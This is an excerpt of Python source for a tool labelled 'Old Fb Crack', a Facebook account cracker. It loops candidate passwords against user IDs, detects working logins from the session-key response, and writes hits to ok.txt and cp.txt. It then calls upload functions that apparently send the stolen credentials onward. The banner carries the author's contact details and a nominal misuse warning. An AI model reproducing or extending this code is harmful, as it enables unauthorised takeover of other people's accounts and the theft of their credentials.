...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/skcayber/approval/blob/main/SHAH-approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;91m          |_____/|_|  |_/_/    \_\_|  |_|
 ...
 > \033[0;96mFACEBOOK ID   : MURTAJIZ-SHAH
 > \033[0;96mWHATSAPP      : +923176371364
 \033[0;96m> GITHUB        : MURTAJIZ-SHAH
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
    """)
		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Crack"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: SHAH): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHAH-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SHAH-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SHAH-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SHAH-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
